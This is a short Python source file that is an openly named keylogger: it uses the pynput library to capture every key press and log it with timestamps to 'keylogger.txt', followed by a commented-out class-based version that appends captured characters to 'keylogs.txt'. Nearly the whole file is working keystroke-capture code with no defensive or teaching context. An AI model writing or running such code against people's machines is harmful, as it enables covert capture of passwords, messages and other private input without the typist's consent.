from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylogger.txt"), 
                    level=logging.DEBUG, 
                    format=" %(asctime)s - %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()

# from pynput import keyboard


# class KeyLogger():
#     def __init__(self, filename: str = "keylogs.txt") -> None:
#         self.filename = filename

#     @staticmethod
#     def get_char(key):
#         try:
#             return key.char
#         except AttributeError:
#             return str(key)

#     def on_press(self, key):
#         print(key)
#         with open(self.filename, 'a') as logs:
#             logs.write(self.get_char(key))

#     def main(self):
#         listener = keyboard.Listener(
#             on_press=self.on_press,
#         )
#         listener.start()


# if __name__ == '__main__':
#     logger = KeyLogger()
#     logger.main()
#     input()